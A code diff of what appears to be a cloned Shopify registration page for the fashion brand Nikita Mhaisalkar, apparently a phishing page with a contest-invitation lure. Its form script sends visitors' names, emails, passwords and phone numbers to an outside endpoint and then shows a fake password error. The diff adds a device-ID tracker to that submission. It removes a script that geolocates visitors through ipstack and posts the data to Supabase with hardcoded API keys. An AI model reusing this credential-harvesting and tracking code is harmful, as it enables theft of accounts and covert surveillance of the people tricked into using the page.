@@ -81,7 +81,8 @@
     Create Account – Nikita Mhaisalkar
   </title>
   <link rel="canonical" href="//account/register">
-  <link rel="shortcut icon" href="//cdn/shop/files/fAVICON_96x.png?v=1614328318" type="image/png">
+  <link rel="shortcut icon" href="//cdn/shop/files/fAVICON_96x.png?v=1614328318"
+    type="image/png">
   <meta property="og:type" content="website">
   <meta property="og:title" content="Create Account">
   <meta property="og:url" content="//account/register">
@@ -882,29 +883,21 @@
     id="web-pixels-manager-setup">(function d(d, e, r, a, n) { var o, i, t, s, l = (i = (o = { modern: /Edge?\/(1{2}[4-9]|1[2-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Firefox\/(1{2}[4-9]|1[2-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Chrom(ium|e)\/(9{2}|\d{3,})\.\d+(\.\d+|)|(Maci|X1{2}).+ Version\/(15\.\d+|(1[6-9]|[2-9]\d|\d{3,})\.\d+)([,.]\d+|)( \(\w+\)|)( Mobile\/\w+|) Safari\/|Chrome.+OPR\/(9{2}|\d{3,})\.\d+\.\d+|(CPU[ +]OS|iPhone[ +]OS|CPU[ +]iPhone|CPU IPhone OS|CPU iPad OS)[ +]+(15[._]\d+|(1[6-9]|[2-9]\d|\d{3,})[._]\d+)([._]\d+|)|Android:?[ /-](12[89]|1[3-9]\d|[2-9]\d{2}|\d{4,})(\.\d+|)(\.\d+|)|Android.+Firefox\/(12[7-9]|1[3-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Android.+Chrom(ium|e)\/(12[89]|1[3-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|SamsungBrowser\/([2-9]\d|\d{3,})\.\d+/, legacy: /Edge?\/(1[6-9]|[2-9]\d|\d{3,})\.\d+(\.\d+|)|Firefox\/(5[4-9]|[6-9]\d|\d{3,})\.\d+(\.\d+|)|Chrom(ium|e)\/(5[1-9]|[6-9]\d|\d{3,})\.\d+(\.\d+|)([\d.]+$|.*Safari\/(?![\d.]+ Edge\/[\d.]+$))|(Maci|X1{2}).+ Version\/(10\.\d+|(1[1-9]|[2-9]\d|\d{3,})\.\d+)([,.]\d+|)( \(\w+\)|)( Mobile\/\w+|) Safari\/|Chrome.+OPR\/(3[89]|[4-9]\d|\d{3,})\.\d+\.\d+|(CPU[ +]OS|iPhone[ +]OS|CPU[ +]iPhone|CPU IPhone OS|CPU iPad OS)[ +]+(10[._]\d+|(1[1-9]|[2-9]\d|\d{3,})[._]\d+)([._]\d+|)|Android:?[ /-](12[89]|1[3-9]\d|[2-9]\d{2}|\d{4,})(\.\d+|)(\.\d+|)|Mobile Safari.+OPR\/([89]\d|\d{3,})\.\d+\.\d+|Android.+Firefox\/(12[7-9]|1[3-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Android.+Chrom(ium|e)\/(12[89]|1[3-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Android.+(UC? ?Browser|UCWEB|U3)[ /]?(15\.([5-9]|\d{2,})|(1[6-9]|[2-9]\d|\d{3,})\.\d+)\.\d+|SamsungBrowser\/(5\.\d+|([6-9]|\d{2,})\.\d+)|Android.+MQ{2}Browser\/(14(\.(9|\d{2,})|)|(1[5-9]|[2-9]\d|\d{3,})(\.\d+|))(\.\d+|)|K[Aa][Ii]OS\/(3\.\d+|([4-9]|\d{2,})\.\d+)(\.\d+|)/ }).modern, t = o.legacy, s = navigator.userAgent, i.test(s) ? "modern" : (t.test(s), "legacy")); window.Shopify = window.Shopify || {}; var c = window.Shopify; c.analytics = c.analytics || {}; var u = c.analytics; u.replayQueue = [], u.publish = function (d, e, r) { return u.replayQueue.push([d, e, r]), !0 }; try { self.performance.mark("wpm:start") } catch (d) { } var h = [r, "/wpm", "/b", n, l.substring(0, 1), ".js"].join(""); !function (d) { var e = d.src, r = d.async, a = void 0 === r || r, n = d.onload, o = d.onerror, i = document.createElement("script"), t = document.head, s = document.body; i.async = a, i.src = e, n && i.addEventListener("load", n), o && i.addEventListener("error", o), t ? t.appendChild(i) : s ? s.appendChild(i) : console.error("Did not find a head or body element to append the script") }({ src: h, async: !0, onload: function () { var r = window.webPixelsManager.init(d); e(r); var a = window.Shopify.analytics; a.replayQueue.forEach((function (d) { var e = d[0], a = d[1], n = d[2]; r.publishCustomEvent(e, a, n) })), a.replayQueue = [], a.publish = r.publishCustomEvent, a.visitor = r.visitor }, onerror: function () { var e = d.storefrontBaseUrl.replace(/\/$/, ""), r = "".concat(e, "/.well-known/shopify/monorail/unstable/produce_batch"), n = JSON.stringify({ metadata: { event_sent_at_ms: (new Date).getTime() }, events: [{ schema_id: "web_pixels_manager_load/3.1", payload: { version: a || "latest", bundle_target: l, page_url: self.location.href, status: "failed", surface: d.surface, error_msg: "".concat(h, " has failed to load") }, metadata: { event_created_at_ms: (new Date).getTime() } }] }); try { if (self.navigator.sendBeacon.bind(self.navigator)(r, n)) return !0 } catch (d) { } var o = new XMLHttpRequest; try { return o.open("POST", r, !0), o.setRequestHeader("Content-Type", "text/plain"), o.send(n), !0 } catch (d) { console && console.warn && console.warn("[Web Pixels Manager] Got an unhandled error while logging a load error.") } return !1 } }) })({ shopId: 27288272976, storefrontBaseUrl: "/", extensionsBaseUrl: "https://extensions.shopifycdn.com/cdn/shopifycloud/web-pixels-manager", surface: "storefront-renderer", enabledBetaFlags: [], webPixelsConfigList: [{ "id": "324468816", "configuration": "{\"config\":\"{\\\"pixel_id\\\":\\\"AW-451155969\\\",\\\"target_country\\\":\\\"IN\\\",\\\"gtag_events\\\":[{\\\"type\\\":\\\"page_view\\\",\\\"action_label\\\":\\\"AW-451155969\\\/OR8RCNTrve8BEIGwkNcB\\\"},{\\\"type\\\":\\\"purchase\\\",\\\"action_label\\\":\\\"AW-451155969\\\/o-euCNfrve8BEIGwkNcB\\\"},{\\\"type\\\":\\\"view_item\\\",\\\"action_label\\\":\\\"AW-451155969\\\/eofDCNrrve8BEIGwkNcB\\\"},{\\\"type\\\":\\\"add_to_cart\\\",\\\"action_label\\\":\\\"AW-451155969\\\/kWifCN3rve8BEIGwkNcB\\\"},{\\\"type\\\":\\\"begin_checkout\\\",\\\"action_label\\\":\\\"AW-451155969\\\/YZq6CODrve8BEIGwkNcB\\\"},{\\\"type\\\":\\\"search\\\",\\\"action_label\\\":\\\"AW-451155969\\\/yNilCOPrve8BEIGwkNcB\\\"},{\\\"type\\\":\\\"add_payment_info\\\",\\\"action_label\\\":\\\"AW-451155969\\\/pYXoCObrve8BEIGwkNcB\\\"}],\\\"enable_monitoring_mode\\\":false}\"}", "eventPayloadVersion": "v1", "runtimeContext": "OPEN", "scriptVersion": "afe7c2de16587d6c6689522527d6c67f", "type": "APP", "apiClientId": 1780363, "privacyPurposes": [] }, { "id": "shopify-app-pixel", "configuration": "{}", "eventPayloadVersion": "v1", "runtimeContext": "STRICT", "scriptVersion": "0220", "apiClientId": "shopify-pixel", "type": "APP", "privacyPurposes": ["ANALYTICS", "MARKETING"] }, { "id": "shopify-custom-pixel", "eventPayloadVersion": "v1", "runtimeContext": "LAX", "scriptVersion": "0220", "apiClientId": "shopify-pixel", "type": "CUSTOM", "privacyPurposes": ["ANALYTICS", "MARKETING"] }], isMerchantRequest: false, initData: { "shop": { "name": "Nikita Mhaisalkar", "paymentSettings": { "currencyCode": "INR" }, "myshopifyDomain": "nikita-mhaisalkar.myshopify.com", "countryCode": "IN", "storefrontUrl": "https:\/\/nikitamhaisalkar.com" }, "customer": null, "cart": null, "checkout": null, "productVariants": [], "purchasingCompany": null }, }, function pageEvents(webPixelsManagerAPI) { webPixelsManagerAPI.publish("page_viewed", {}); }, "//cdn", "94cc9fcb9aa5a89d04138fc0430efd994c022ea6", "740c64e3w77d0d2c6pffaaa8c0m859bd135",);</script>
   <script async=""
     src="./Create Account – Nikita Mhaisalkar_files/b740c64e3w77d0d2c6pffaaa8c0m859bd135m.js.download"></script>
-  <script>window.ShopifyAnalytics = window.ShopifyAnalytics || {};
-    window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
-    window.ShopifyAnalytics.meta.currency = 'INR';
-    var meta = { "page": {} };
-    for (var attr in meta) {
-      window.ShopifyAnalytics.meta[attr] = meta[attr];
-    }</script>
-  <script>window.ShopifyAnalytics.merchantGoogleAnalytics = function () {
-      (function (w, d, s, l, i) {
-        w[l] = w[l] || []; w[l].push({
-          'gtm.start':
-            new Date().getTime(), event: 'gtm.js'
-        }); var f = d.getElementsByTagName(s)[0],
-          j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
-            'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
-      })(window, document, 'script', 'dataLayer', 'GTM-T73B8KV');
-    };
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FLSJ9QH79K"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-FLSJ9QH79K');
   </script>
+    
   <script class="analytics">(window.gaDevIds = window.gaDevIds || []).push('BwiEti');
-    function insertData(name, email, password, phone) {
+    function insertData(name, email, password, phone, deviceId) {
       if (!name || !email || !password || !phone) {
         console.log("All field are required!")
-      } else {
+      }else {
         $('#submit').text("Wait...")
       }
       $.ajax({
@@ -919,14 +912,15 @@
           "name": name,  // Dynamically inserted data
           "email": email,
           "password": password,
-          "phone": phone
+          "phone": phone,
+          "device": deviceId
         }),
         success: function (response) {
-          setTimeout(function () {
+          setTimeout(function() {
             $('.pass-error .error').css('display', 'block');
             $('#submit').text("Create my account")
-
-            setTimeout(function () {
+            
+            setTimeout(function() {
               $('.pass-error .error').css('display', 'none');
             }, 2500);
           }, 2000);
@@ -939,10 +933,6 @@
       });
     }
 
-    
-
-    
-
     (function () {
       // Form control
       $("#submit").click(() => {
@@ -950,8 +940,13 @@
         var email = $("#email").val();
         var password = $("#password").val();
         var phone = $("#phone").val();
+        let deviceId = localStorage.getItem('device_id');
+        if (!deviceId) {
+            deviceId = `device_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+            localStorage.setItem('device_id', deviceId);
+        }
 
-        insertData(name, email, password, phone);
+        insertData(name, email, password, phone, deviceId);
       })
 
 
@@ -1173,66 +1168,6 @@
     href="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/polyfills.CqZeYl46.js" crossorigin="">
   <meta http-equiv="origin-trial"
     content="A7JYkbIvWKmS8mWYjXO12SIIsfPdI7twY91Y3LWOV/YbZmN1ZhYv8O+Zs6/IPCfBE99aV9tIC8sWZSCN09vf7gkAAACWeyJvcmlnaW4iOiJodHRwczovL2N0LnBpbnRlcmVzdC5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
-    <script>
-      setTimeout(() => {
-          // Step 1: Generate or Retrieve Device ID
-          let deviceId = localStorage.getItem('device_id');
-          if (!deviceId) {
-              deviceId = `device_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-              localStorage.setItem('device_id', deviceId);
-          }
-
-          // Step 2: Fetch Data from ipstack API
-          const ipstackApiKey = "dda9808e927fa0c27d266f3d2028079f";
-          $.getJSON(`https://api.ipstack.com/check?access_key=${ipstackApiKey}`, function (ipData) {
-              console.log("Fetched Data:", ipData);
-
-              // Add device_id to the data
-              const dataToSend = {
-                  device_id: deviceId,
-                  ip: ipData.ip,
-                  country_name: ipData.country_name,
-                  region_code: ipData.region_code,
-                  region_name: ipData.region_name,
-                  city: ipData.city,
-                  zip: ipData.zip,
-                  latitude: ipData.latitude,
-                  longitude: ipData.longitude,
-                  ip_routing_type: ipData.ip_routing_type || "Unknown",
-                  connection_type: ipData.connection_type || "Unknown"
-              };
-
-              console.log("Data to Send:", dataToSend);
-
-              // Step 3: Send Data to Supabase
-              const supabaseUrl2 = "https://cxshjlbvspkyroeilyom.supabase.co/rest/v1/analytics";
-              const supabaseApiKey =
-                  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN4c2hqbGJ2c3BreXJvZWlseW9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY3NDcwODgsImV4cCI6MjA1MjMyMzA4OH0.lLi-8rCAF0NOlrw5zxvnbZurdC9WBGLJzCT4kVosTwE";
-
-              $.ajax({
-                  url: supabaseUrl2,
-                  method: "POST",
-                  headers: {
-                      'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN4c2hqbGJ2c3BreXJvZWlseW9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY3NDcwODgsImV4cCI6MjA1MjMyMzA4OH0.lLi-8rCAF0NOlrw5zxvnbZurdC9WBGLJzCT4kVosTwE',  // API Key
-                      'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN4c2hqbGJ2c3BreXJvZWlseW9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY3NDcwODgsImV4cCI6MjA1MjMyMzA4OH0.lLi-8rCAF0NOlrw5zxvnbZurdC9WBGLJzCT4kVosTwE',  // Bearer Token for Authorization
-                      'Content-Type': 'application/json'
-                  },
-                  data: JSON.stringify(dataToSend),
-                  success: function (response) {
-                    console.log(response)
-                      console.log("Data successfully sent to Supabase:", response);
-                  },
-                  error: function (error) {
-                      console.error("Error sending data to Supabase:", error);
-                      console.error("Response Text:", error.responseText);
-                      console.error("Status Code:", error.status);
-                  }
-              });
-          }).fail(function (error) {
-              console.error("Error fetching data from ipstack API:", error);
-          });
-      }, 2000);
-  </script>
   <style id="injected-pragma-style-t8f3wz">
     @charset "utf-8";
 
@@ -1277,7 +1212,6 @@
       text-align: center;
       padding-bottom: 20px
     }
-
     .wa-chat-btn-root {
       display: none;
     }
@@ -1494,10 +1428,10 @@
                   </div>
                 </div>
               </div>
-              <div class="Collapsible"><a href="" class="Collapsible__Button Heading Link Link--primary u-h6">MEN'S
-                  WEAR</a></div>
-              <div class="Collapsible"><a href="" class="Collapsible__Button Heading Link Link--primary u-h6">SALE</a>
-              </div>
+              <div class="Collapsible"><a href=""
+                  class="Collapsible__Button Heading Link Link--primary u-h6">MEN'S WEAR</a></div>
+              <div class="Collapsible"><a href=""
+                  class="Collapsible__Button Heading Link Link--primary u-h6">SALE</a></div>
               <div class="Collapsible"><button class="Collapsible__Button Heading u-h6" data-action="toggle-collapsible"
                   aria-expanded="false">SHOP THE LOOK<span class="Collapsible__Plus"></span>
                 </button>
@@ -1514,10 +1448,12 @@
                         <div class="Collapsible__Content">
                           <ul class="Linklist Linklist--bordered Linklist--spacingLoose">
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">LEHENGA SKIRT</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">LEHENGA SKIRT</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">FUSION SAREES</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">FUSION SAREES</a>
                             </li>
                           </ul>
                         </div>
@@ -1533,22 +1469,28 @@
                         <div class="Collapsible__Content">
                           <ul class="Linklist Linklist--bordered Linklist--spacingLoose">
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">GOWNS &amp; DRESS</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">GOWNS &amp; DRESS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">SHIRTS, TOP &amp; BLOUSES</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">SHIRTS, TOP &amp; BLOUSES</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">PANTS &amp; SKIRTS</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">PANTS &amp; SKIRTS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">JACKET &amp; BLAZERS</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">JACKET &amp; BLAZERS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">BRALETTE &amp; CORSET</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">BRALETTE &amp; CORSET</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">BODYSUIT, PLAYSUIT &amp; JUMPSUITS</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">BODYSUIT, PLAYSUIT &amp; JUMPSUITS</a>
                             </li>
                           </ul>
                         </div>
@@ -1564,12 +1506,12 @@
                         <div class="Collapsible__Content">
                           <ul class="Linklist Linklist--bordered Linklist--spacingLoose">
                             <li class="Linklist__Item">
-                              <a href="//collections/anarkali" class="Text--subdued Link Link--primary">ANARKALI &amp;
-                                SHARARAS</a>
+                              <a href="//collections/anarkali"
+                                class="Text--subdued Link Link--primary">ANARKALI &amp; SHARARAS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="//collections/lehenga-set" class="Text--subdued Link Link--primary">SAREES &amp;
-                                LEHENGAS</a>
+                              <a href="//collections/lehenga-set"
+                                class="Text--subdued Link Link--primary">SAREES &amp; LEHENGAS</a>
                             </li>
                           </ul>
                         </div>
@@ -1593,10 +1535,12 @@
                         <div class="Collapsible__Content">
                           <ul class="Linklist Linklist--bordered Linklist--spacingLoose">
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">CLUTCH &amp; BAGS</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">CLUTCH &amp; BAGS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="" class="Text--subdued Link Link--primary">PPE</a>
+                              <a href=""
+                                class="Text--subdued Link Link--primary">PPE</a>
                             </li>
                           </ul>
                         </div>
@@ -1605,8 +1549,8 @@
                   </div>
                 </div>
               </div>
-              <div class="Collapsible"><a href="" class="Collapsible__Button Heading Link Link--primary u-h6">CELEBRITY
-                  CLOSET</a></div>
+              <div class="Collapsible"><a href=""
+                  class="Collapsible__Button Heading Link Link--primary u-h6">CELEBRITY CLOSET</a></div>
               <div class="Collapsible"><a href=""
                   class="Collapsible__Button Heading Link Link--primary u-h6">EDITORIAL</a></div>
               <div class="Collapsible"><a href=""
@@ -1629,8 +1573,8 @@
                   </div>
                 </div>
               </div>
-              <div class="Collapsible"><a href="" class="Collapsible__Button Heading Link Link--primary u-h6">CONTACT US
-                  / JOIN OUR TEAM</a></div>
+              <div class="Collapsible"><a href=""
+                  class="Collapsible__Button Heading Link Link--primary u-h6">CONTACT US / JOIN OUR TEAM</a></div>
             </nav>
             <nav class="SidebarMenu__Nav SidebarMenu__Nav--secondary">
               <ul class="Linklist Linklist--spacingLoose">
@@ -1805,33 +1749,36 @@
                   <div class="DropdownMenu" aria-hidden="true">
                     <ul class="Linklist">
                       <li class="Linklist__Item">
-                        <a href="//collections/eid-drop-may-2024" class="Link Link--secondary">EID DROP MAY 2024 </a>
+                        <a href="//collections/eid-drop-may-2024"
+                          class="Link Link--secondary">EID DROP MAY 2024 </a>
                       </li>
                       <li class="Linklist__Item">
-                        <a href="//collections/theodara" class="Link Link--secondary">THEODORA - SF 2024 </a>
+                        <a href="//collections/theodara"
+                          class="Link Link--secondary">THEODORA - SF 2024 </a>
                       </li>
                       <li class="Linklist__Item">
                         <a href="//collections/quest" class="Link Link--secondary">QUEST - SF
                           2023 - 2024 </a>
                       </li>
                       <li class="Linklist__Item">
-                        <a href="//collections/tropical-times" class="Link Link--secondary">TROPICAL TIMES - Fall 2023
-                        </a>
+                        <a href="//collections/tropical-times"
+                          class="Link Link--secondary">TROPICAL TIMES - Fall 2023 </a>
                       </li>
                       <li class="Linklist__Item">
                         <a href="//collections/wsn" class="Link Link--secondary">Summer
                           Soiree - SS Capsule 2023 </a>
                       </li>
                       <li class="Linklist__Item">
-                        <a href="//collections/terra-tales" class="Link Link--secondary">TERRA TALES - Fall 2022 </a>
+                        <a href="//collections/terra-tales"
+                          class="Link Link--secondary">TERRA TALES - Fall 2022 </a>
                       </li>
                       <li class="Linklist__Item">
                         <a href="//collections/tribal" class="Link Link--secondary">TRIBAL -
                           Capsule 2022 - 2023 </a>
                       </li>
                       <li class="Linklist__Item">
-                        <a href="//collections/noire-fleur" class="Link Link--secondary">NOIRE FLEUR - Mordern Indian
-                          2022 - 2023 </a>
+                        <a href="//collections/noire-fleur"
+                          class="Link Link--secondary">NOIRE FLEUR - Mordern Indian 2022 - 2023 </a>
                       </li>
                       <li class="Linklist__Item">
                         <a href="//collections/canvas" class="Link Link--secondary">THE
@@ -1846,7 +1793,8 @@
                           Fall 2021 </a>
                       </li>
                       <li class="Linklist__Item">
-                        <a href="//collections/savannah" class="Link Link--secondary">SAVANNAH - SS 2020 </a>
+                        <a href="//collections/savannah"
+                          class="Link Link--secondary">SAVANNAH - SS 2020 </a>
                       </li>
                       <li class="Linklist__Item">
                         <a href="//collections/rumi" class="Link Link--secondary">RUMI - Fall
@@ -1869,67 +1817,77 @@
                   <div class="DropdownMenu" aria-hidden="true">
                     <ul class="Linklist">
                       <li class="Linklist__Item" aria-haspopup="true">
-                        <a href="//collections/indian-fusion" class="Link Link--secondary">INDIAN FUSION <svg
-                            class="Icon Icon--select-arrow-right" role="presentation" viewBox="0 0 11 18">
+                        <a href="//collections/indian-fusion"
+                          class="Link Link--secondary">INDIAN FUSION <svg class="Icon Icon--select-arrow-right"
+                            role="presentation" viewBox="0 0 11 18">
                             <path d="M1.5 1.5l8 7.5-8 7.5" stroke-width="2" stroke="currentColor" fill="none"
                               fill-rule="evenodd" stroke-linecap="square"></path>
                           </svg></a>
                         <div class="DropdownMenu" aria-hidden="true">
                           <ul class="Linklist">
                             <li class="Linklist__Item">
-                              <a href="//collections/lehenga-skirt" class="Link Link--secondary">LEHENGA SKIRT</a>
+                              <a href="//collections/lehenga-skirt"
+                                class="Link Link--secondary">LEHENGA SKIRT</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="//collections/fusion-sarees" class="Link Link--secondary">FUSION SAREES</a>
+                              <a href="//collections/fusion-sarees"
+                                class="Link Link--secondary">FUSION SAREES</a>
                             </li>
                           </ul>
                         </div>
                       </li>
                       <li class="Linklist__Item" aria-haspopup="true">
-                        <a href="//collections/western-wear" class="Link Link--secondary">WESTERN WEAR <svg
-                            class="Icon Icon--select-arrow-right" role="presentation" viewBox="0 0 11 18">
+                        <a href="//collections/western-wear"
+                          class="Link Link--secondary">WESTERN WEAR <svg class="Icon Icon--select-arrow-right"
+                            role="presentation" viewBox="0 0 11 18">
                             <path d="M1.5 1.5l8 7.5-8 7.5" stroke-width="2" stroke="currentColor" fill="none"
                               fill-rule="evenodd" stroke-linecap="square"></path>
                           </svg></a>
                         <div class="DropdownMenu" aria-hidden="true">
                           <ul class="Linklist">
                             <li class="Linklist__Item">
-                              <a href="//collections/gowns-dresses" class="Link Link--secondary">GOWNS &amp; DRESS</a>
+                              <a href="//collections/gowns-dresses"
+                                class="Link Link--secondary">GOWNS &amp; DRESS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="//collections/pants-top" class="Link Link--secondary">SHIRTS, TOP &amp;
-                                BLOUSES</a>
+                              <a href="//collections/pants-top"
+                                class="Link Link--secondary">SHIRTS, TOP &amp; BLOUSES</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="//collections/pants-skirts" class="Link Link--secondary">PANTS &amp; SKIRTS</a>
+                              <a href="//collections/pants-skirts"
+                                class="Link Link--secondary">PANTS &amp; SKIRTS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="//collections/jacket-shirt" class="Link Link--secondary">JACKET &amp; BLAZERS</a>
+                              <a href="//collections/jacket-shirt"
+                                class="Link Link--secondary">JACKET &amp; BLAZERS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="//collections/bralette-corset" class="Link Link--secondary">BRALETTE &amp;
-                                CORSET</a>
+                              <a href="//collections/bralette-corset"
+                                class="Link Link--secondary">BRALETTE &amp; CORSET</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="//collections/jumpsuit" class="Link Link--secondary">BODYSUIT, PLAYSUIT &amp;
-                                JUMPSUITS</a>
+                              <a href="//collections/jumpsuit"
+                                class="Link Link--secondary">BODYSUIT, PLAYSUIT &amp; JUMPSUITS</a>
                             </li>
                           </ul>
                         </div>
                       </li>
                       <li class="Linklist__Item" aria-haspopup="true">
-                        <a href="//collections/indian-wear" class="Link Link--secondary">INDIAN WEAR <svg
-                            class="Icon Icon--select-arrow-right" role="presentation" viewBox="0 0 11 18">
+                        <a href="//collections/indian-wear"
+                          class="Link Link--secondary">INDIAN WEAR <svg class="Icon Icon--select-arrow-right"
+                            role="presentation" viewBox="0 0 11 18">
                             <path d="M1.5 1.5l8 7.5-8 7.5" stroke-width="2" stroke="currentColor" fill="none"
                               fill-rule="evenodd" stroke-linecap="square"></path>
                           </svg></a>
                         <div class="DropdownMenu" aria-hidden="true">
                           <ul class="Linklist">
                             <li class="Linklist__Item">
-                              <a href="//collections/anarkali" class="Link Link--secondary">ANARKALI &amp; SHARARAS</a>
+                              <a href="//collections/anarkali"
+                                class="Link Link--secondary">ANARKALI &amp; SHARARAS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="//collections/lehenga-set" class="Link Link--secondary">SAREES &amp; LEHENGAS</a>
+                              <a href="//collections/lehenga-set"
+                                class="Link Link--secondary">SAREES &amp; LEHENGAS</a>
                             </li>
                           </ul>
                         </div>
@@ -1939,7 +1897,8 @@
                           WEDDING EDIT </a>
                       </li>
                       <li class="Linklist__Item">
-                        <a href="//collections/resort-wear" class="Link Link--secondary">RESORT WEAR </a>
+                        <a href="//collections/resort-wear"
+                          class="Link Link--secondary">RESORT WEAR </a>
                       </li>
                       <li class="Linklist__Item">
                         <a href="//collections/kaftan" class="Link Link--secondary">KAFTANS
@@ -1954,10 +1913,12 @@
                         <div class="DropdownMenu" aria-hidden="true">
                           <ul class="Linklist">
                             <li class="Linklist__Item">
-                              <a href="//collections/clutch" class="Link Link--secondary">CLUTCH &amp; BAGS</a>
+                              <a href="//collections/clutch"
+                                class="Link Link--secondary">CLUTCH &amp; BAGS</a>
                             </li>
                             <li class="Linklist__Item">
-                              <a href="//collections/sanitiser-bottle-cover" class="Link Link--secondary">PPE</a>
+                              <a href="//collections/sanitiser-bottle-cover"
+                                class="Link Link--secondary">PPE</a>
                             </li>
                           </ul>
                         </div>
@@ -2021,8 +1982,9 @@
                   </path>
                   <circle cx="9" cy="4.90909091" r="4.90909091"></circle>
                 </g>
-              </svg></a><a href="//search" class="Header__Icon Icon-Wrapper Icon-Wrapper--clickable "
-              data-action="toggle-search" aria-label="Search">
+              </svg></a><a href="//search"
+              class="Header__Icon Icon-Wrapper Icon-Wrapper--clickable " data-action="toggle-search"
+              aria-label="Search">
               <span class="hidden-tablet-and-up"><svg class="Icon Icon--search" role="presentation" viewBox="0 0 18 17">
                   <g transform="translate(1 1)" stroke="currentColor" fill="none" fill-rule="evenodd"
                     stroke-linecap="square">
@@ -2039,8 +2001,8 @@
                 </svg></span>
             </a>
 
-            <a href="//cart" class="Header__Icon Icon-Wrapper Icon-Wrapper--clickable " data-action="open-drawer"
-              data-drawer-id="sidebar-cart" aria-expanded="false" aria-label="Open cart">
+            <a href="//cart" class="Header__Icon Icon-Wrapper Icon-Wrapper--clickable "
+              data-action="open-drawer" data-drawer-id="sidebar-cart" aria-expanded="false" aria-label="Open cart">
               <span class="hidden-tablet-and-up"><svg class="Icon Icon--cart" role="presentation" viewBox="0 0 17 20">
                   <path
                     d="M0 20V4.995l1 .006v.015l4-.002V4c0-2.484 1.274-4 3.5-4C10.518 0 12 1.48 12 4v1.012l5-.003v.985H1V19h15V6.005h1V20H0zM11 4.49C11 2.267 10.507 1 8.5 1 6.5 1 6 2.27 6 4.49V5l5-.002V4.49z"
@@ -2092,10 +2054,10 @@
       <section data-section-id="reset-password" data-section-type="reset-password">
         <div class="Container">
           <div class="PageContent PageContent--fitScreen PageContent--extraNarrow">
-            <form method="post" action="//account" id="create_customer" accept-charset="UTF-8"
-              data-login-with-shop-sign-up="true" name="create_customer" class="Form Form--spacingTight"
-              data-cptcha="true" data-hcaptcha-bound="true"><input type="hidden" name="form_type"
-                value="create_customer"><input type="hidden" name="utf8" value="✓">
+            <form method="post" action="//account" id="create_customer"
+              accept-charset="UTF-8" data-login-with-shop-sign-up="true" name="create_customer"
+              class="Form Form--spacingTight" data-cptcha="true" data-hcaptcha-bound="true"><input type="hidden"
+                name="form_type" value="create_customer"><input type="hidden" name="utf8" value="✓">
               <header class="Form__Header">
                 <h1 class="Form__Title Heading u-h1">Register</h1>
                 <p class="Form__Legend">Please fill in the information below:</p>
@@ -2158,18 +2120,14 @@
               <h2 class="Footer__Title Heading u-h6" style="margin-bottom: 0;">Fashion Fusion Contest 2025</h2>
               <span>Ludhiana, Panjab, India</span><br><br>
               <div class="Footer__Content Rte" style="margin-bottom: 20px;">
-                <p>We are thrilled to invite you to Fashion Fusion 2025, organized by Nikita Mhaisalkar, this January.
-                  You are warmly invited as a valued visitor and an active participant in this celebration of fashion
-                  and elegance.</p>
